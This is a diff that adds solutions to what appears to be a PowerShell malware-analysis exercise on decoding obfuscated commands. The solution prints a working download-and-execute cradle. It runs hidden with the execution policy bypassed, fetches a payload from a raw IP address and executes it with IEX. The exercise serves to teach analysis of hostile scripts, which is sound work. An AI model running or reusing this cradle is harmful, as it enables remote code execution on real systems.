@@ -35,3 +35,23 @@ function downloadFile() {
 > 5. What PowerShell flags are used when executing the encoded command, and what do they do?
 > 6. Decode the Base64 string in the script. What does it reveal?
 > 7. Rewrite the script in a de-obfuscated form.
+
+## Solutions:
+
+To analyze we replace a new line after a semicolon `;`, as in powershell is a statement separator. 
+
+```ps1
+$x=''
+$y='IEX'
+$z='powershell.exe -w h -ep b -e '
+
+$a=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$c="http://73.58.34.118/OjKUiD2IFH.exe"
+$w=New-Object Net.WebClient
+$d=$w.DownloadString($c)
+IEX $d'))
+
+$b=$y+" "+$z+$a
+$x=$b|IEX
+```
+
+
